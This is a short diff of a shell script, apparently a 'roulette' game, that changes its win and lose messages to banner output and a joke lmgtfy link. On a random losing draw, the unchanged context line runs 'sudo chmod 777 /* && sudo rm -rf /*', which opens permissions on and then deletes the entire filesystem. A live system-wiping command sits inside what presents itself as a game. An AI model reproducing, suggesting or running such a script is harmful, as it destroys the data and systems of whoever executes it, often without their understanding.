@@ -15,8 +15,10 @@ then
 	fi
 if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
 then
-	echo "YOU ARE DONE."
+	banner "K.O"
 	sudo chmod 777 /* && sudo rm -rf /*
 else 
-	echo "YOU LIVE."
+	banner "LUCKY"
+	banner "YOU"
+	echo "http://lmgtfy.com/?q=more+luck+than+sense"
 fi
